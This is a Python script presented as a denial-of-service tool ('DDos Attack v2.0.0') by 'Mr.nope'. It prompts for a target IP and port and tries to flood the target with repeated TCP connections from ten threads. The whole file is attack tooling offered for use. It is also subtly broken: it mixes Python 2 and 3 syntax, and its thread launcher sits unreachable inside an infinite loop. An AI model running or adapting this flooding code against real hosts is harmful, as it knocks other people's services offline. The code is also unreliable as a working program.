#!/usr/bin/python3
# This code write by (Mr.nope)
# DDos Attack v2.0.0
import os
try:
   from colorama import Fore,init
   init()
except ImportError:
    os.system("pip3 install colorama")
import time
import sys
import socket
import threading
import platform
system = platform.uname()[0]
def title():
    if system == 'Linux':
      os.system("printf '\033]2;DDos-Attack\a'")
    elif system == 'Windows':
        os.system("title DDos-Attack")
    else:
         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
         sys.exit()         
def cls():
    if system == 'Windows':
      os.system("cls")
    elif system == 'Linux':
        os.system("clear")
    else:
         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
         sys.exit()
class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'
def menu():
    title()
    cls()
    print color.green + """
 ______   ______   _______  _______         _______  _______  _______  _______  _______  ___   _
|      | |      | |       ||       |       |   _   ||       ||       ||   _   ||       ||   | | |
|  _    ||  _    ||   _   ||  _____| ____  |  |_|  ||_     _||_     _||  |_|  ||       ||   |_| |
| | |   || | |   ||  | |  || |_____ |____| |       |  |   |    |   |  |       ||       ||      _|
| |_|   || |_|   ||  |_|  ||_____  |       |       |  |   |    |   |  |       ||      _||     |_
|       ||       ||       | _____| |       |   _   |  |   |    |   |  |   _   ||     |_ |    _  |
|______| |______| |_______||_______|       |__| |__|  |___|    |___|  |__| |__||_______||___| |_|\n""" + color.blue + """
     ----[    This code write by (Mr.nope)   ]---
     -------[ github :""" + color.blue + """ https://github.com/mrprogrammer2938/ ]-----------""" + color.End
    web = input("\nEnter Target ip: ")
    time.sleep(1)
    port = input("\nEnter Target port: ")
    victim_ip = socket.gethostbyname(web)
    ##################################################
    UDP_PORT = port
    time.sleep(2)
    MESSAGE = "01010101001010101101010"
    time.sleep(1)
    os.system("clear")
    print color.red + "=============================================================================\n" + color.End
    print"Target IP:", victim_ip
    time.sleep(1)
    print"\nTarget port:", UDP_PORT
    color.red + "=============================================================================\n" + color.End
    time.sleep(3)
    def run(k):
        while True:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((web,port))
             print(f"Packet send To {victim_ip}")
        for i in range(10):
           c = threading.Thread(target=run, args=[i])
           c.start()
if __name__ == '__main__':
    try:
        try:
           menu()
        except EOFError:
            print "\nCtrl + D"
            print "\nExiting..."
            sys.exit()
    except KeyboardInterrupt:
        print "\nCtrl + C"
        print "\nExiting..."
        sys.exit()
# Thanks For using :)
